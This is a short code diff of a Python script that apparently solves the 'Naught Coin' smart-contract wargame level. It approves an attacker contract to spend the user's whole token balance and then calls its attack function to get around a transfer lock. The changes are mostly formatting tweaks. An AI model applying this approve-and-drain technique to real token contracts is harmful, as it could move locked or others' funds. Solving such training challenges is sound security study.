@@ -23,22 +23,19 @@ def main():
 
     # exploit goes here
     # note that you can approve yourself, but in this case I chose to approve my hacker contract
+    print(f"\n-- Our balance before the exploit: {naught_coin.balanceOf(user)} ---\n")
     print(
-        f"\n-- Our balance before the exploit: {naught_coin.balanceOf(user.address)} ---\n"
-    )
-    print(
-        f"\n--- Balance of our hacker contract: {naught_coin.balanceOf(hacker.address)} ---\n"
+        f"\n--- Balance of our hacker contract: {naught_coin.balanceOf(hacker)} ---\n"
     )
     print("\n--- Exploiting level instance ---\n")
-    naught_coin.approve(
-        hacker.address, naught_coin.balanceOf(user.address), sender=user
-    )
+
+    naught_coin.approve(hacker, naught_coin.balanceOf(user), sender=user)
+
     hacker.attack(sender=user)
+
+    print(f"\n-- Our balance after the exploit: {naught_coin.balanceOf(user)} ---\n")
     print(
-        f"\n-- Our balance after the exploit: {naught_coin.balanceOf(user.address)} ---\n"
-    )
-    print(
-        f"\n--- Balance of our hacker contract: {naught_coin.balanceOf(hacker.address)} ---\n"
+        f"\n--- Balance of our hacker contract: {naught_coin.balanceOf(hacker)} ---\n"
     )
 
     # submiting level instance
